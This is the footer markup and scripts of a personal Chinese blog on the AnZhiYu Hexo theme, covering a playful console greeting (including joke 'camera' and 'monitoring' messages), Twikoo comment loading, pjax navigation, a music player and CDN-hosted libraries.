var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("02/18/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `你好，欢迎你来到我的博客!`,
    `保持热爱，奔赴山海✨`,
    `
        
    ██╗  ██╗██╗██╗  ██╗ ██████╗ ██████╗ ██╗  ██╗ ██████╗
    ██║  ██║██║██║  ██║██╔═══██╗██╔══██╗██║ ██╔╝██╔════╝
    ███████║██║███████║██║   ██║██████╔╝█████╔╝ ██║     
    ██╔══██║██║██╔══██║██║   ██║██╔═══╝ ██╔═██╗ ██║     
    ██║  ██║██║██║  ██║╚██████╔╝██║     ██║  ██╗╚██████╗
    ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝ ╚═════╝
        
    `,
    "已上线",
    dnum,
    "天",
    "©2023 By hihopkc V1.6.9",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小丑】.`, `Photo captured: `, `🤣👉🏻🤡`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小丑.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hihopkc 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.56.5/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://hihopkc.space/',
      region: '',
      onCommentLoaded: () => {
        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(runFn,0)
    else getScript('https://cdn.cbd.int/twikoo@1.6.21/dist/twikoo.all.min.js').then(runFn)
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://hihopkc.space/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const runFn = () => {
    init();
    
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else {
      loadTwikoo()
    }
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getComment = () => {
    const runTwikoo = () => {
      twikoo.getRecentComments({
        envId: 'https://hihopkc.space/',
        region: '',
        pageSize: 6,
        includeReply: true
      }).then(function (res) {
        const twikooArray = res.map(e => {
          return {
            'content': changeContent(e.comment),
            'avatar': e.avatar,
            'nick': e.nick,
            'url': e.url + '#' + e.id,
            'date': new Date(e.created).toISOString()
          }
        })

        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
        generateHtml(twikooArray)
      }).catch(function (err) {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      })
    }

    if (typeof twikoo === 'object') {
      runTwikoo()
    } else {
      getScript('https://cdn.cbd.int/twikoo@1.6.21/dist/twikoo.all.min.js').then(runTwikoo)
    }
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
        }
        
        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom.innerHTML= result
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('twikoo-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "visitor@anheyu.com";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script type="text/javascript" src="/js/fps.js"></script><div id="fps"></div><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"]):not([href="/music/"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>